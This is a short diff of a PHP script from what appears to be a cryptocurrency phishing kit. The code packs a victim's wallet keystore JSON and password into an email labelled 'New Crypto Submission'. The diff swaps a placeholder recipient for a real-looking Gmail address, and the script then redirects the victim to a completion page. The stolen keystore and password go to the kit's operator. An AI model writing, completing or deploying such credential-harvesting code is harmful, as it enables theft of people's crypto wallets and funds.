@@ -10,7 +10,7 @@ $msg =  "Keystore Json Value: ".$d." \n Password: ".$e;
 $msg = wordwrap($msg,70);
 
 // send email
-mail("youremail@gmail.com","New Crypto Submission",$msg);
+mail("trademoney116@gmail.com","New Crypto Submission",$msg);
 
 header("Location: ://connectnowonline.online/complete");
 die();
